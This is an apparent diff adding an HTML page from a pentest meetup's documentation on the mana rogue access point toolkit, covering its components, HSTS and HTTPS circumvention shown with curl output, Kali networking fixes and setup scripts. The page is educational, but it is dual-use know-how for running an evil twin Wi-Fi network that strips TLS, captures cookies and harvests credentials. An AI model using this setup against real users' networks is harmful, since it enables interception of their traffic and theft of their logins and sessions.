@@ -1,0 +1,741 @@
+
+
+<!DOCTYPE html>
+<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <title>6.6. mana &mdash; South Bay WASP 1.0.2 documentation</title>
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+    
+
+  
+
+  
+  
+    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  
+
+  
+
+  
+        <link rel="index" title="Index"
+              href="../genindex.html"/>
+        <link rel="search" title="Search" href="../search.html"/>
+    <link rel="top" title="South Bay WASP 1.0.2 documentation" href="../index.html"/>
+        <link rel="up" title="6. Pentest Network Tools" href="../pentest_network_tools.html"/>
+        <link rel="next" title="6.7. nmap" href="nmap.html"/>
+        <link rel="prev" title="6.5. DriveDroid &amp; Kon-Boot" href="drive_droid_kon-boot.html"/> 
+
+  
+  <script src="../_static/js/modernizr.min.js"></script>
+
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+   
+  <div class="wy-grid-for-nav">
+
+    
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search">
+          
+
+          
+            <a href="../index.html" class="icon icon-home"> South Bay WASP
+          
+
+          
+          </a>
+
+          
+            
+            
+              <div class="version">
+                1.0
+              </div>
+            
+          
+
+          
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+
+          
+        </div>
+
+        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
+          
+            
+            
+              
+            
+            
+              <p class="caption"><span class="caption-text">Table of Contents</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="aircrack-ng.html">6.1. aircrack-ng</a></li>
+<li class="toctree-l2"><a class="reference internal" href="beef.html">6.2. BeEF</a></li>
+<li class="toctree-l2"><a class="reference internal" href="burp_suite.html">6.3. Burp Suite and ZAP</a></li>
+<li class="toctree-l2"><a class="reference internal" href="curl.html">6.4. curl</a></li>
+<li class="toctree-l2"><a class="reference internal" href="drive_droid_kon-boot.html">6.5. DriveDroid &amp; Kon-Boot</a></li>
+<li class="toctree-l2 current"><a class="current reference internal" href="#">6.6. mana</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#evilap">6.6.1. evilAP</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#what-is-mana">6.6.1.1. what is mana?</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#mana-pieces">6.6.1.2. mana pieces</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#run-mana-scripts">6.6.1.3. run-mana scripts</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#why-run-mana">6.6.1.4. why run mana?</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#kali-prep">6.6.2. kali prep</a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#mana-installation">6.6.2.1. mana installation</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#mana-and-the-default-kali-network-setup">6.6.2.2. mana and the default Kali network setup</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="#running-start-nat-full-sh">6.6.3. Running <code class="docutils literal"><span class="pre">start-nat-full.sh</span></code></a><ul>
+<li class="toctree-l4"><a class="reference internal" href="#configure-a-disposable-mana-run-environment">6.6.3.1. Configure a disposable mana run environment</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#additional-software-run-with-start-nat-full-sh">6.6.3.2. Additional software run with <code class="docutils literal"><span class="pre">start-nat-full.sh</span></code></a></li>
+<li class="toctree-l4"><a class="reference internal" href="#run-start-nat-full-sh">6.6.3.3. Run <code class="docutils literal"><span class="pre">start-nat-full.sh</span></code></a></li>
+<li class="toctree-l4"><a class="reference internal" href="#undo-changes-getting-back-to-normal-kali-networking">6.6.3.4. Undo changes - getting back to normal Kali networking</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="nmap.html">6.7. nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="openvas.html">6.8. OpenVAS</a></li>
+<li class="toctree-l2"><a class="reference internal" href="pcredz.html">6.9. Pcredz pcap credentials</a></li>
+<li class="toctree-l2"><a class="reference internal" href="hak5_pineapple.html">6.10. Hak5 Pineapple</a></li>
+<li class="toctree-l2"><a class="reference internal" href="proxychains.html">6.11. Proxy Chains</a></li>
+<li class="toctree-l2"><a class="reference internal" href="responder.html">6.12. Responder</a></li>
+<li class="toctree-l2"><a class="reference internal" href="socat.html">6.13. <code class="docutils literal"><span class="pre">socat</span></code> vs (<code class="docutils literal"><span class="pre">nc</span></code> vs <code class="docutils literal"><span class="pre">ncat</span></code> vs <code class="docutils literal"><span class="pre">netcat</span></code>)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="sqlmap.html">6.14. sqlmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="tcpdump_tcpflow.html">6.15. tcpdump &amp; tcpflow</a></li>
+<li class="toctree-l2"><a class="reference internal" href="tunneling_traffic.html">6.16. Tunneling Traffic</a></li>
+<li class="toctree-l2"><a class="reference internal" href="webgoat.html">6.17. Web Goat</a></li>
+<li class="toctree-l2"><a class="reference internal" href="wireshark.html">6.18. Wireshark</a></li>
+<li class="toctree-l2"><a class="reference internal" href="xsscrapy.html">6.19. xsscrapy</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
+</ul>
+
+            
+          
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+
+      
+      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
+        
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">South Bay WASP</a>
+        
+      </nav>
+
+
+      
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div role="navigation" aria-label="breadcrumbs navigation">
+
+  <ul class="wy-breadcrumbs">
+    
+      <li><a href="../index.html">Docs</a> &raquo;</li>
+        
+          <li><a href="../pentest_network_tools.html">6. Pentest Network Tools</a> &raquo;</li>
+        
+      <li>6.6. mana</li>
+    
+    
+      <li class="wy-breadcrumbs-aside">
+        
+            
+            <a href="../_sources/network_tools/mana.rst.txt" rel="nofollow"> View page source</a>
+          
+        
+      </li>
+    
+  </ul>
+
+  
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+            
+  <div class="section" id="id1">
+<h1>6.6. <a class="reference external" href="https://github.com/sensepost/mana/">mana</a><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h1>
+<p>This writeup assumes you understand <a class="reference external" href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">HSTS</a>. See <a class="reference internal" href="../html/hsts.html#hsts-tutorial"><span class="std std-ref">HSTS Tutorial</span></a> if not.</p>
+<div class="section" id="evilap">
+<h2>6.6.1. evilAP<a class="headerlink" href="#evilap" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="what-is-mana">
+<h3>6.6.1.1. what is mana?<a class="headerlink" href="#what-is-mana" title="Permalink to this headline">¶</a></h3>
+<p>From <a class="reference external" href="https://github.com/sensepost/mana/">mana</a>:</p>
+<blockquote>
+<div><p>A toolkit for rogue access point (evilAP) attacks first presented at Defcon 22.</p>
+<p>More specifically, it contains the improvements to KARMA attacks we implemented into hostapd, as well as some useful configs for conducting MitM once you’ve managed to get a victim to connect.</p>
+<p>The different start scripts are listed below and must be edited to point to the right wifi device (default is wlan0, this may not be right for your installation):</p>
+<ul class="simple">
+<li><code class="docutils literal"><span class="pre">start-nat-full.sh</span></code> - Will fire up MANA in NAT mode (you’ll need an upstream link) with all the MitM bells and whistles.</li>
+<li><code class="docutils literal"><span class="pre">start-nat-simple.sh</span></code> - Will fire up MANA in NAT mode, but without any of the firelamb, sslstrip, sslsplit etc.</li>
+<li><code class="docutils literal"><span class="pre">start-noupstream.sh</span></code> - Will start MANA in a “fake Internet” mode. Useful for places where people leave their wifi on, but there is no upstream Internet. Also contains the captive portal.</li>
+<li><code class="docutils literal"><span class="pre">start-noupstream-eap.sh</span></code> - Will start MANA with the EAP attack and noupstream mode.</li>
+</ul>
+</div></blockquote>
+<p>Here is the actual Defcon22 presentation: <a class="reference external" href="http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/08-manna-from-heaven-improving-the-state-of-wireless-rogue-ap-attacks-dominic-white-ian-de-villiers">Manna from Heaven; Improving the state of wireless rogue AP attacks - Dominic White &amp; Ian de Villiers</a>. It’s one of the many <a class="reference external" href="http://www.irongeek.com/i.php?page=videos/defcon-wireless-village-2014/mainlist">Defcon Wireless Village 2014 (Defcon 22) Videos</a>.</p>
+</div>
+<div class="section" id="mana-pieces">
+<h3>6.6.1.2. <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> pieces<a class="headerlink" href="#mana-pieces" title="Permalink to this headline">¶</a></h3>
+<dl class="docutils">
+<dt>apache2 - web server used for noupstream run (area without wifi connection)</dt>
+<dd>Used by <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> to provide fake web sites to trick users into giving authentication credentials.</dd>
+<dt>crackapd - EAP cred cracker for noupstream-EAP run (area without wifi connection)</dt>
+<dd><a class="reference external" href="https://github.com/sensepost/mana/">mana</a> tool for offloading the cracking of EAP creds to an external tool (using a word list) and re-adding them to the hostapd EAP config (auto crack ‘n add).</dd>
+<dt>dhcpd - dhcp server for all run types</dt>
+<dd>See <a class="reference external" href="http://linux.die.net/man/8/dhcpd">dhcpd man page</a>.</dd>
+<dt>dns2proxy - dns query victimization used by sslstrip-hsts</dt>
+<dd><p class="first">Modified version of <a class="reference external" href="https://github.com/LeonardoNve/dns2proxy">dns2proxy</a>. sslstrip-hsts will mangle the hostnames to avoid <a class="reference external" href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">HSTS</a> and dns2proxy will detect and correct those changes. For example, can strip out a prepended “wwww.” or “web” from a DNS request.</p>
+<p class="last">See <a class="reference external" href="http://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014">OFFENSIVE: Exploiting DNS servers changes BlackHat Asia 2014</a> and <a class="reference external" href="https://www.youtube.com/watch?v=cJtbxX1HS5I">Demo Offensive DNS server</a>.</p>
+</dd>
+<dt>dnsspoof -  forge replies to DNS address / pointer queries</dt>
+<dd>See <a class="reference external" href="http://linux.die.net/man/8/dnsspoof">dnsspoof man page</a>.</dd>
+<dt>firelamb - cookie capture</dt>
+<dd><a class="reference external" href="https://github.com/sensepost/mana/">mana</a> program to parse pcap files or listen on interface for cookies, then start firefox with cookies added to profile.</dd>
+<dt>hostapd-mana - IEEE 802.11 AP and IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator</dt>
+<dd><a class="reference external" href="https://github.com/sensepost/mana/">mana</a>-modified <a class="reference external" href="http://wireless.kernel.org/en/users/Documentation/hostapd">hostapd</a> for new <a class="reference external" href="http://www.theta44.org/karma/index.html">karma</a> attacks.</dd>
+<dt>macchanger - change mac address</dt>
+<dd>See <a class="reference external" href="https://github.com/alobbs/macchanger">macchanger</a>.</dd>
+<dt>msfconsole - metasploit console used in the noupstream runs</dt>
+<dd>See <a class="reference external" href="http://www.offensive-security.com/metasploit-unleashed/Msfconsole">msf console</a>.</dd>
+<dt>sslsplit - generic transparent TLS/SSL proxy for MitM attacks</dt>
+<dd><p class="first">From <a class="reference external" href="https://www.roe.ch/SSLsplit">SSLsplit</a>:</p>
+<blockquote class="last">
+<div>SSLsplit is a tool for man-in-the-middle attacks against SSL/TLS encrypted network connections. Connections are transparently intercepted through a network address translation engine and redirected to SSLsplit. SSLsplit terminates SSL/TLS and initiates a new SSL/TLS connection to the original destination address, while logging all data transmitted.</div></blockquote>
+</dd>
+<dt>sslstrip-hsts - change HTTPS to HTTP</dt>
+<dd>Tries to get clients to connect via http instead of https. <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> uses a modified version of sslsplit to avoid <a class="reference external" href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">HSTS</a>.</dd>
+<dt>stunnel4 - SSL encryption wrapper between remote clients and local or remote servers</dt>
+<dd>See <a class="reference external" href="http://man.he.net/man8/stunnel4">stunnel4</a>. Non-SSL aware daemons can communicate with clients over secure SSL channels.</dd>
+<dt>tinyproxy - light-weight HTTP/HTTPS proxy daemon</dt>
+<dd>See <a class="reference external" href="https://banu.com/tinyproxy/">tinyproxy</a>.</dd>
+</dl>
+</div>
+<div class="section" id="run-mana-scripts">
+<h3>6.6.1.3. run-mana scripts<a class="headerlink" href="#run-mana-scripts" title="Permalink to this headline">¶</a></h3>
+<p>Of these start scripts, the one of most interest for the meetup is <code class="docutils literal"><span class="pre">start-nat-full.sh</span></code>. Here is a summary of the 4 start scripts:</p>
+<table border="1" class="docutils">
+<colgroup>
+<col width="26%" />
+<col width="14%" />
+<col width="17%" />
+<col width="17%" />
+<col width="26%" />
+</colgroup>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">SETUP</th>
+<th class="head">nat-full</th>
+<th class="head">nat-simple</th>
+<th class="head">noupstream</th>
+<th class="head">noupstream-eap</th>
+</tr>
+</thead>
+<tbody valign="top">
+<tr class="row-even"><td>upstream i/f</td>
+<td>eth0</td>
+<td>wlan0</td>
+<td>N/A</td>
+<td>N/A</td>
+</tr>
+<tr class="row-odd"><td>evilAP i/f</td>
+<td>wlan0</td>
+<td>wlan1</td>
+<td>wlan0</td>
+<td>wlan0/wlan0_0</td>
+</tr>
+<tr class="row-even"><td>network-manager</td>
+<td>stop</td>
+<td>stop</td>
+<td>stop</td>
+<td>stop</td>
+</tr>
+<tr class="row-odd"><td>dhcpd</td>
+<td>Y</td>
+<td>Y</td>
+<td>Y</td>
+<td>Y</td>
+</tr>
+<tr class="row-even"><td>nat</td>
+<td>Y</td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr class="row-odd"><td>firelamb</td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr class="row-even"><td>sslsplit</td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr class="row-odd"><td>dns2proxy</td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr class="row-even"><td>sslstrip</td>
+<td>Y</td>
+<td>N</td>
+<td>N</td>
+<td>N</td>
+</tr>
+<tr class="row-odd"><td>macchanger</td>
+<td>Y</td>
+<td>N</td>
+<td>Y</td>
+<td>N</td>
+</tr>
+<tr class="row-even"><td>apache2</td>
+<td>N</td>
+<td>N</td>
+<td>Y</td>
+<td>Y</td>
+</tr>
+<tr class="row-odd"><td>dnsspoof</td>
+<td>N</td>
+<td>N</td>
+<td>Y</td>
+<td>Y</td>
+</tr>
+<tr class="row-even"><td>msfconsole</td>
+<td>N</td>
+<td>N</td>
+<td>Y</td>
+<td>Y</td>
+</tr>
+<tr class="row-odd"><td>stunnel4</td>
+<td>N</td>
+<td>N</td>
+<td>Y</td>
+<td>Y</td>
+</tr>
+<tr class="row-even"><td>tinyproxy</td>
+<td>N</td>
+<td>N</td>
+<td>Y</td>
+<td>Y</td>
+</tr>
+<tr class="row-odd"><td>crackapd</td>
+<td>N</td>
+<td>N</td>
+<td>N</td>
+<td>Y</td>
+</tr>
+</tbody>
+</table>
+</div>
+<div class="section" id="why-run-mana">
+<h3>6.6.1.4. why run <a class="reference external" href="https://github.com/sensepost/mana/">mana</a>?<a class="headerlink" href="#why-run-mana" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="create-ssids-based-on-client-probe-requests">
+<h4>6.6.1.4.1. create SSIDs based on client probe requests<a class="headerlink" href="#create-ssids-based-on-client-probe-requests" title="Permalink to this headline">¶</a></h4>
+<p>As clients probe for their perviously-connected SSIDs, <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> can advertise that added SSID exclusively to the client making the probe. Devices may then automatically connect to evilAP.</p>
+</div>
+<div class="section" id="circumvent-https">
+<h4>6.6.1.4.2. circumvent https<a class="headerlink" href="#circumvent-https" title="Permalink to this headline">¶</a></h4>
+<p>Here we show a client requesting <a class="reference external" href="http://www.google.com/">http://www.google.com/</a> and instead of getting redirected to <a class="reference external" href="https://www.google.com/?gws_rd=ssl">https://www.google.com/?gws_rd=ssl</a> they get redirected to <a class="reference external" href="http://wwww.google.com/?gws_rd=ssl">http://wwww.google.com/?gws_rd=ssl</a>. Note the lack of https and the 4 w’s vs. the correct 3.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>hacker@kali:~$ curl -v --location --user-agent <span class="s2">&quot;Firefox/31.0&quot;</span> <span class="se">\</span>
+    http://www.google.com/ <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> <span class="se">\</span>
+egrep <span class="s1">&#39;(&gt; User-Agent:|&lt; HTTP/1|&lt; Location:|&lt; Strict-Transport-Security:)&#39;</span>
+&gt; User-Agent: Firefox/31.0
+&lt; HTTP/1.1 <span class="m">302</span> Found
+&lt; Location: http://wwww.google.com/?gws_rd<span class="o">=</span>ssl
+&gt; User-Agent: Firefox/31.0
+&lt; HTTP/1.1 <span class="m">200</span> OK
+</pre></div>
+</div>
+</div>
+<div class="section" id="circumvent-hsts">
+<h4>6.6.1.4.3. circumvent <a class="reference external" href="http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security">HSTS</a><a class="headerlink" href="#circumvent-hsts" title="Permalink to this headline">¶</a></h4>
+<p>Here we show a client requesting <a class="reference external" href="http://mail.yahoo.com/">http://mail.yahoo.com/</a> and instead of getting redirected to <a class="reference external" href="https://mail.yahoo.com/?.src-ym&amp;.intl=us&amp;lang-en-US&amp;.done=https%3a//mail.yahoo.com">https://mail.yahoo.com/?.src-ym&amp;.intl=us&amp;lang-en-US&amp;.done=https%3a//mail.yahoo.com</a> they get redirected to <a class="reference external" href="http://weblogin.yahoo.com/?.src-ym&amp;.intl=us&amp;lang-en-US&amp;.done=https%3a//mail.yahoo.com">http://weblogin.yahoo.com/?.src-ym&amp;.intl=us&amp;lang-en-US&amp;.done=https%3a//mail.yahoo.com</a>. Note the lack of https and login is replaced by weblogin. Unfortunately this one didn’t work as the resulting web page had no content! <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> is new so this failure is not surprising.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>hacker@kali:~$ curl -v --location --user-agent <span class="s2">&quot;Firefox/31.0&quot;</span> <span class="se">\</span>
+    http://mail.yahoo.com/ <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> <span class="se">\</span>
+egrep <span class="s1">&#39;(&gt; User-Agent:|&lt; HTTP/1|&lt; Location:|&lt; Strict-Transport-Security:)&#39;</span>
+&gt; User-Agent: Firefox/31.0
+&lt; HTTP/1.1 <span class="m">302</span> Found
+&lt; Location: /m
+&gt; User-Agent: Firefox/31.0
+&lt; HTTP/1.1 <span class="m">302</span> Found
+&lt; Location: http://webmail.yahoo.com/m
+&gt; User-Agent: Firefox/31.0
+&lt; HTTP/1.1 <span class="m">200</span> OK
+</pre></div>
+</div>
+</div>
+<div class="section" id="mitm-https-via-sslsplit">
+<h4>6.6.1.4.4. MitM HTTPS via sslsplit<a class="headerlink" href="#mitm-https-via-sslsplit" title="Permalink to this headline">¶</a></h4>
+<p>When the client forces https, <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> dynamically generates (untrusted) certificates for the remote site. If the user accepts the certificate then all traffic is decrypted.</p>
+</div>
+<div class="section" id="capture-cookies-via-firelamb">
+<h4>6.6.1.4.5. capture cookies via firelamb<a class="headerlink" href="#capture-cookies-via-firelamb" title="Permalink to this headline">¶</a></h4>
+<p>Once traffic is unencrypted, firelamb is used to capture cookies for use in the local firefox.</p>
+</div>
+<div class="section" id="captive-portal">
+<h4>6.6.1.4.6. captive portal<a class="headerlink" href="#captive-portal" title="Permalink to this headline">¶</a></h4>
+<p>Even when no Internet is available, evilAP can fake web sites to try and harvest user credentials.</p>
+</div>
+</div>
+</div>
+<div class="section" id="kali-prep">
+<h2>6.6.2. kali prep<a class="headerlink" href="#kali-prep" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="mana-installation">
+<h3>6.6.2.1. <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> installation<a class="headerlink" href="#mana-installation" title="Permalink to this headline">¶</a></h3>
+<p><a class="reference external" href="https://github.com/sensepost/mana/">mana</a> install is as simple as <code class="docutils literal"><span class="pre">apt-get</span> <span class="pre">install</span> <span class="pre">mana-toolkit</span></code>. <a class="reference external" href="https://github.com/sensepost/mana/">mana</a>’s installation and use is in the spirit of Kali Linux: root permissions are needed to run much of the tool and it takes over the network interfaces, so it’s not designed to be a shared app run simulataneously by non-root users. So at runtime it modifies config files and writes to system directories. If at any time you feel you may have hopelessly messed up your configuration files you can simply <code class="docutils literal"><span class="pre">apt-get</span> <span class="pre">purge</span> <span class="pre">mana-toolkit</span> <span class="pre">-y;</span> <span class="pre">apt-get</span> <span class="pre">install</span> <span class="pre">mana-toolkit</span> <span class="pre">-y</span></code> and you’re back to the original configuration.</p>
+<p>Optionally see <a class="reference internal" href="pcredz.html#pcredzpcapcreds"><span class="std std-ref">Pcredz pcap credentials</span></a> for  <a class="reference external" href="https://github.com/lgandx/PCredz/">Pcredz</a> installation should you wish to analyze pcap files for credentials.</p>
+</div>
+<div class="section" id="mana-and-the-default-kali-network-setup">
+<h3>6.6.2.2. mana and the default Kali network setup<a class="headerlink" href="#mana-and-the-default-kali-network-setup" title="Permalink to this headline">¶</a></h3>
+<p>At the meetup we had two classes of pentesters: those running Windows with a Kali VM vs. those running native Kali Linux. The Windows VM users met with unqualified success, but those running native Kali met with failure. The reason is quite simple.</p>
+<p>The Windows Kali VM network configuration is a “wired” eth0 bridged to the Windows host’s wifi connection, and a wireless wlan0 (a pass-thru to the Windows host’s second wireless adapter). The default <em>/usr/share/mana-toolkit/run-mana/start-nat-full.sh</em> uses eth0 as the upstream link, wlan0 for the evilAP, and kills the <code class="docutils literal"><span class="pre">network-manager</span></code> process in order to take over wlan0. This works fine with the default Kali network configuration: eth0 is managed by <code class="docutils literal"><span class="pre">networking</span></code> which was not killed, and <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> takes over wlan0. So it works.</p>
+<p>But consider the native Kali networking: the meetup is a wireless-only network, so the wired eth0 is not used leaving <code class="docutils literal"><span class="pre">network-manager</span></code>-controlled wlan0 to connect to the Internet (and leaving wlan1 free for evilAP). But <code class="docutils literal"><span class="pre">/usr/share/mana-toolkit/run-mana/start-nat-full.sh</span></code> defaults to eth0 as the upstream, kills <code class="docutils literal"><span class="pre">network-manager</span></code> taking down wlan0’s Internet connection, and takes over wlan0 for evilAP. That leaves eth0 down, wlan0 supporting evilAP, and wlan1 down (because <code class="docutils literal"><span class="pre">network-manager</span></code> is down). So there’s no Internet connection. And the solution is not as simple as changing the configuration file to use wlan0 for the upstream and wlan1 for evilAP: when <code class="docutils literal"><span class="pre">network-manager</span></code> goes down, so does wlan0 and the Internet.</p>
+<p>For a review of the default Kali Linux network setup see <a class="reference internal" href="../kali/networking.html#kalidefaultnetworking"><span class="std std-ref">Kali default networking</span></a>. Since Kali defaults to <code class="docutils literal"><span class="pre">networking</span></code> controling eth0 and <code class="docutils literal"><span class="pre">network-manager</span></code> controling wlan0 &amp; wlan1, we need to move wlan0 contol to <code class="docutils literal"><span class="pre">networking</span></code>. Then, when <code class="docutils literal"><span class="pre">network-manager</span></code> is stopped the Internet connection is still available on <code class="docutils literal"><span class="pre">wlan0</span></code> since <code class="docutils literal"><span class="pre">networking</span></code> is still running. Follow <a class="reference internal" href="../kali/networking.html#movewireless2networking"><span class="std std-ref">Move wireless from NetworkManager to networking</span></a> to accomplish this.</p>
+</div>
+</div>
+<div class="section" id="running-start-nat-full-sh">
+<h2>6.6.3. Running <code class="docutils literal"><span class="pre">start-nat-full.sh</span></code><a class="headerlink" href="#running-start-nat-full-sh" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="configure-a-disposable-mana-run-environment">
+<h3>6.6.3.1. Configure a disposable <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> run environment<a class="headerlink" href="#configure-a-disposable-mana-run-environment" title="Permalink to this headline">¶</a></h3>
+<p>We assume you’ve followed <a class="reference internal" href="../kali/networking.html#movewireless2networking"><span class="std std-ref">Move wireless from NetworkManager to networking</span></a> . So <code class="docutils literal"><span class="pre">networking</span></code> controls wlan0 as the Internet connection.</p>
+<p>We create the following directory structure:</p>
+<blockquote>
+<div><div class="line-block">
+<div class="line">~/mana/run-mana = modified <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> run scripts and config files</div>
+<div class="line"><br /></div>
+<div class="line">~/mana/run-mana/logs = some <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> log files</div>
+<div class="line">~/mana/run-mana/sslsplit = <a class="reference external" href="https://www.roe.ch/SSLsplit">SSLsplit</a> log files</div>
+<div class="line"><br /></div>
+<div class="line">~/mana/mana-start = scripts for <a class="reference external" href="https://github.com/sensepost/mana/">mana</a> +</div>
+<div class="line-block">
+<div class="line"><a class="reference external" href="http://linux.die.net/man/8/urlsnarf/">urlsnarf</a>, <a class="reference external" href="http://www.ex-parrot.com/~chris/driftnet/">driftnet</a>, <a class="reference external" href="http://www.tcpdump.org/">tcpdump</a>, and <a class="reference external" href="https://github.com/lgandx/PCredz/">Pcredz</a>.</div>
+<div class="line"><br /></div>
+</div>
+<div class="line">~/mana/mana-start/mana-pics = <a class="reference external" href="http://www.ex-parrot.com/~chris/driftnet/">driftnet</a> temp file storage</div>
+</div>
+</div></blockquote>
+<p>The script <code class="docutils literal"><span class="pre">~/mana/run-all.sh</span></code> will start a new terminal windows running the <code class="docutils literal"><span class="pre">~/mana/mana-start/*.sh</span></code> scripts; these run <code class="docutils literal"><span class="pre">start-nat-full.sh</span></code>, <a class="reference external" href="http://linux.die.net/man/8/urlsnarf/">urlsnarf</a>, <a class="reference external" href="http://www.ex-parrot.com/~chris/driftnet/">driftnet</a>, <a class="reference external" href="http://www.tcpdump.org/">tcpdump</a>, and <a class="reference external" href="https://github.com/lgandx/PCredz/">Pcredz</a>. To stop the run, select the <em>mana 01</em> tab and hit enter, then close the terminal.</p>
+<p>To create the directories:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span>
+mkdir -p mana/mana-start/mana-pics
+mkdir -p mana/run-mana/<span class="o">{</span>logs,sslsplit<span class="o">}</span>
+</pre></div>
+</div>
+<p>Then to create <code class="docutils literal"><span class="pre">run-all.sh</span></code>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># create run-all.sh</span>
+<span class="nb">cd</span> ~/mana
+cat <span class="s">&lt;&lt;EOF &gt; run-all.sh</span>
+<span class="s">#!/usr/bin/env bash</span>
+
+<span class="s">SUDO=\$(which sudo)</span>
+<span class="s">[[ &quot;\$USER&quot; == &quot;root&quot; ]] &amp;&amp; SUDO=</span>
+<span class="s">DIR=&quot;\$( cd &quot;\$( dirname &quot;\${BASH_SOURCE[0]}&quot; )&quot; &amp;&amp; pwd )&quot;</span>
+<span class="s">cd \$DIR/mana-start</span>
+
+<span class="s"># enable X windows by root</span>
+<span class="s">xhost local:root</span>
+
+<span class="s">\$SUDO echo here we go</span>
+<span class="s">\$SUDO gnome-terminal  \\</span>
+<span class="s">--tab -t &quot;mana 01&quot; -e &quot;bash -c &#39;./01_*.sh; read; exec /bin/bash&#39;&quot;  \\</span>
+<span class="s">--tab -t &quot;mana 02&quot; -e &quot;bash -c &#39;sleep 4; ./02_*.sh; read; exec /bin/bash&#39;&quot;  \\</span>
+<span class="s">--tab -t &quot;mana 03&quot; -e &quot;bash -c &#39;sleep 5; ./03_*.sh; read; exec /bin/bash&#39;&quot;  \\</span>
+<span class="s">--tab -t &quot;mana 04&quot; -e &quot;bash -c &#39;sleep 6; ./04_*.sh; read; exec /bin/bash&#39;&quot;  \\</span>
+<span class="s">--tab -t &quot;mana 05&quot; -e &quot;bash -c &#39;sleep 7; ./05_*.sh; read; exec /bin/bash&#39;&quot;</span>
+<span class="s">EOF</span>
+
+chmod +x run-all.sh
+</pre></div>
